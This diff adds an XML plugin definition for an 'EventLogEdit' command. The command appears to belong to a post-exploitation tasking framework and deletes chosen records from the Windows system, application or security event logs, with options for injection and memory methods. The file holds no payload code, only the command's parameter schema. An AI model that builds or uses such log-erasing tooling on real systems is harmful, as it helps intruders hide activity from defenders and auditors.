@@ -1,0 +1,43 @@
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+
+<Plugin providerName='Tasking/Mcl_Cmd_EventLogEdit_Tasking.pyo' providerType='script'>
+
+    <Command name='EventLogEdit' id='0'>
+
+		<Help>This program allows the user to remove an entry from the event log.</Help>
+
+		<Input>
+			<Option name='log' optional='false'>
+				<Argument name='logfile' data='logname'/>
+				<Help>One of system, application, or security</Help>
+			</Option>
+
+			<Option name='record' optional='false'>
+				<Argument name='record_number' data='recnum'/>
+				<Help>The number of the record you wish to delete</Help>
+			</Option>
+
+			<Option name='searchlen' optional='true'>
+				<Argument name='search_len' data='searchlen'/>
+				<Help>The number of bytes used in the search for the initial log pointer (default=0x1000000)</Help>
+			</Option>
+
+			<Option name='method' optional='true'>
+				<Help>Specifies injection and memory method - will use current default if not specified.</Help>
+				<Argument name='inject' data='inject'/>
+				<Argument name='memory' data='memory'/>
+			</Option>
+
+		</Input>
+
+		<Output>
+			<Data name='logname' type='string'/>
+			<Data name='recnum' type='uint64_t' default='0'/>
+			<Data name='searchlen' type='uint32_t' default='0x1000000' />
+			<Data name='memory'    type='string'/>
+			<Data name='inject'    type='string'/>
+		</Output>
+		
+    </Command>
+    
+</Plugin>
